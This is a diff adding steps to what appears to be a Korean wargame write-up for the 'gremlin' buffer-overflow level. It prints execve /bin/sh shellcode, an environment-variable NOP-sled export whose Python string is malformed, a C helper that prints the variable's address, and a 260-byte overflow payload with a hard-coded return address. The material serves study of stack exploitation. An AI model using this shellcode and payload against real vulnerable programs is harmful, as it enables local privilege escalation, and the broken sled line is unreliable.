@@ -40,6 +40,25 @@ int main(int argc, char *argv[1])
 buffer에서 ebp까지의 거리가 256이라는 것이다.<br>
 
 25byte 쉘코드를 등록해준 후 주소값을 얻는 코드를 통해 주소값을 얻자.<br>
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80<br>
+
+```export shellcode=$(python -c 'print "\n90"*20+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')```<br>
+vi에디터를 이용해 쉘 코드의 주소값을 받아오는 코드를 작성한다.<br>
+```vi shell.c```<br>
+```c
+#include <stdio.h>
+
+int main()
+{
+    printf("%p\n", getenv("shellcode"));
+    return 0;
+}
+```
+```
+gcc -o shell shell.c
+./shell
+```
+만든 코드를 실행시키면 쉘 코드의 주소값을 알 수 있다.<br>
 
 **이제 페이로드를 작성해보자.**<br>
 ```../gremlin `python -c 'print "A"*260+"\x25\xfd\xff\xbf"'` ```<br>
